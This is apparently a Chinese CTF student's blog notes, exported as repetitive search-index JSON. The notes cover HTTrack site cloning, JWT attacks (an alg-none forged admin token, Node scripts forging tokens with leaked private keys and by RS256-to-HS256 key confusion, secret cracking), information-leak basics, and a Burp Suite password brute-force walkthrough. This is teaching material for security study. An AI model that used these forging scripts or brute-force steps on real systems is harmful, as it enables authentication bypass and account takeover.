克隆复制镜像差不多，从服务器抓取 HTML 文件、图片、以及其他 CSS 文件并存储到你的计算机上。Kali 2.0 起默认预装了 HTTrack。 使用方法终端下输入: BASH httrack 如果没有安装这个工具的话，那就现场安装一下吧，只需要 2 个命令: BASH apt update \u0026\u0026 apt install httrack 这里提示要输入项目名称、存放网站的路径（默认为 /root/website） 和要克隆的目标站，我们这里以「搜狗浏览器官网」为例 先自定义输入「test」 然后 按下「 回车」 BASH sougou 然后默认路径 「回车」 输入想要克隆的网站 BASH http://ie.sougou.com 下面 HTTrack 提供了一些选项，我们一般选择第二本选项 Mirror Web Site(s) with Wizard（具有向导递归层级的镜像网站） 输入:2 「回车」「 回车」「 回车」 后面的一些基本设置 一般一直「回车」下去 直到网站开始克隆为止，HTTrack 就开始进行网站克隆了。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#介绍-1"},{"categories":["notes"],"content":"\r使用 HTTrack 复制克隆网站\r介绍HTTrack 是一款免费的离线浏览器工具，和 wget 克隆复制镜像差不多，从服务器抓取 HTML 文件、图片、以及其他 CSS 文件并存储到你的计算机上。Kali 2.0 起默认预装了 HTTrack。 使用方法终端下输入: BASH httrack 如果没有安装这个工具的话，那就现场安装一下吧，只需要 2 个命令: BASH apt update \u0026\u0026 apt install httrack 这里提示要输入项目名称、存放网站的路径（默认为 /root/website） 和要克隆的目标站，我们这里以「搜狗浏览器官网」为例 先自定义输入「test」 然后 按下「 回车」 BASH sougou 然后默认路径 「回车」 输入想要克隆的网站 BASH http://ie.sougou.com 下面 HTTrack 提供了一些选项，我们一般选择第二本选项 Mirror Web Site(s) with Wizard（具有向导递归层级的镜像网站） 输入:2 「回车」「 回车」「 回车」 后面的一些基本设置 一般一直「回车」下去 直到网站开始克隆为止，HTTrack 就开始进行网站克隆了。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#使用方法-1"},{"categories":["notes"],"content":"\r小结个人认为：wget 操作简单方便，但是克隆效果不及 HTTrack，HTTrack 虽然比 wget 稍微繁琐了一点，但是在爬一个大型网站上面，完整性要优于 wget。 对了，最后再提醒一下：注意版权。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:3:4","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#小结"},{"categories":["notes"],"content":"\rJWT基本概念json web token(jwt) 是一个轻量级的认证规范,这个规范允许使用jwt在用户和服务器之间传递安全可靠的信息.其本质是一个token,是一种紧凑的url安全方法,用于在网络通信的双方之间传递. 我们可以进jwt官网看一下jwt.io ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#jwt基本概念"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#jwt漏洞"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#空加密算法"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#密钥爆破"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#私钥泄露攻击"},{"categories":["notes"],"content":"\rJWT漏洞\r空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的话，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证 但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成 { \"alg\": \"None\", \"typ\": \"JWT\" } { \"iss\": \"admin\", \"iat\": 1664193697, \"exp\": 1664200897, \"nbf\": 1664193697, \"sub\": \"admin\", \"jti\": \"fa2fb0a80953bd65a5dfe2afec06048e\" } 在两段编码中间用.隔开 ewogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=. (header+”.”+payload+”.”, 去掉了’.’signature字段) 空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。 密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破 私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成 这里就需要在本地安装node，然后npm install jsonwebtoken const jwt = require(\"jsonwebtoken\"); var fs = require(\"fs\"); var privateKey = fs.readFileSync(\"private.key\"); var token =jwt.sign({user:'admin' },privateKey,{algorithm:'RS256'}); console.log(token); 然后写这么个脚本,生成 公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA HMAC是一种对称加密算法，使用相同的密钥进行加解密 RSA是一种非对称加密算法，使用私钥加密，公钥解密 在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token 密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。 const jwt = require(\"jsonwebtoken\");var fs = require(\"fs\");var privateKey = fs.readFileSync(\"public.key\");var token =jwt.sign({user:'admin' },privateKey,{algorithm:'HS256'});console.log(token); 但是这里要注意，我们在进行密钥攻击时，一定要用post方式\r于2022年的SkyNICO三校联赛中，babytoken一题便是一道关于jwt破解题目，由于当时脚本没跑通，并未成功解题(超级遗憾，思路正确，脚本成了绊脚石)。可能是python更新换代的缘故，GitHub上搜到的Python脚本始终没有跑通的，赛后在charmersix师傅的指点下，通过编译c语言版的jwtcrack脚本，成功解题。 附c语言版jwtcrack脚本链接(要先编译)：https://github.com/brendan-rius/c-jwt-cracker ","date":"2022-09-20","objectID":"/web_base-2022.9/:4:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#公钥泄露攻击"},{"categories":["notes"],"content":"\r认识漏洞","date":"2022-09-20","objectID":"/web_base-2022.9/:5:0","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#认识漏洞"},{"categories":["notes"],"content":"\r0x1什么是漏洞？本质上是对现有信息资产的非预期使用，用户通过技术手段访问或者修改到不应该访问到的数据，执行不应执行的代码。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:1","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x1什么是漏洞"},{"categories":["notes"],"content":"\r0x2漏洞产生的原因：设计缺陷、逻辑错误，代码bug、越权漏洞、其他漏洞 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:2","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x2漏洞产生的原因"},{"categories":["notes"],"content":"\r0x3漏洞的利用方式\r危害程度： ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:3","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x3漏洞的利用方式"},{"categories":["notes"],"content":"\r0x4 web题目的做题思路读取flag信息 （判断漏洞类型） ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:4","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x4-web题目的做题思路"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x6信息泄露漏洞利用"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#1http头信息泄露"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#2报错信息泄露"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#3页面信息泄露"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#4robotstxt敏感文件泄露"},{"categories":["notes"],"content":"\r0x6信息泄露漏洞利用\r1.http头信息泄露/admin/表示访问的是admin目录，会默认访问目录里面的索引文件，比如index.html或者index.php /admin表示访问admin文件，如果没有这个文件，就直接返回404，不回去寻找索引文件 （有时候加不加斜杠都能访问到/admin/，是因为配置文件里面进行了相关的设置） /user表示访问的是user路由，而不是访问user这个文件，与要根据server头来判断，比如php、asp、html等，这些都是基于文件的。而那些看起来没有后缀的，则是基于路由的，需要多次判断。 2.报错信息泄露报错信息泄露服务器状态 3.页面信息泄露通过查看网站源码可查看到页面上不显示的信息 4.robots.txt敏感文件泄露防君子不防小人 此地无银三百两 例如，百度的部分robots.txt内容： User-agent: Baiduspider Disallow: /baidu Disallow: /s? Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh User-agent: Googlebot Disallow: /baidu Disallow: /s? Disallow: /shifen/ Disallow: /homepage/ Disallow: /cpro Disallow: /ulink? Disallow: /link? Disallow: /home/news/data/ Disallow: /bh 有些网站不会有robots.txt这个文件，网站的robots文件内容不一定是真的，也有可能以此来钓鱼 5.git文件泄露git是开源的分布式版本控制系统，可以解决多个开发不能并行开发，只能串联开发的问题 浏览瞎猜.git目录里面的文件，分析它的提交过程。 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:5","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#5git文件泄露"},{"categories":["notes"],"content":"\r0x7Burpsuite与爆破(没时间补笔记了，一下内容来自charmersix.icu) 抓包，爆破 bp的安装，Java环境，proxy插件 设置好代理，开启拦截，刷新一下你的浏览器就可以看见抓到的包 这里我们以bugku的一个题目为例子，演示一下使用bp进行爆破 题目链接 现在我们打开题目，开启拦截 然后我们往里填一个自己猜的密码，比如我这里是123456 点提交，就能看见自己抓的包 这里可以看见我们已经抓到了，我们点鼠标右键，发送到intruder 来到位置这里，我们可以把admin位置删掉，因为一开始admin给出了，不需要我们爆破 只需要删除admin两边的§符号即可 我们继续看下一栏 这里选择简单列表即可，然后导入我们从网上下载的top1000密码，开始爆破 失败 通过观察相应包，我们发现，无论是否爆破成功，这里都会通过js告诉你爆破失败 那我么只需要过滤掉{code: 'bugku10000'}就能知道，到底哪个是真正被爆破成功的 然后爆破，就能出密码 ","date":"2022-09-20","objectID":"/web_base-2022.9/:5:6","series":null,"tags":["notes"],"title":"一点无处搁置的基础-2022.9","uri":"/web_base-2022.9/#0x7burpsuite与爆破"},{"categories":null,"content":"\rAbout meQLUT B.C.S in reading ID:Sc0fie1d ","date":"2019-08-02","objectID":"/about/:0:1","series":null,"tags":null,"title":"About","uri":"/about/#about-me"},{"categories":null,"content":"\rContactEmail: scofield_1920@outlook.com ","date":"2019-08-02","objectID":"/about/:0:2","series":null,"tags":null,"title":"About","uri":"/about/#contact"},{"categories":null,"content":" You are not connected to the Internet, only cached pages will be available. 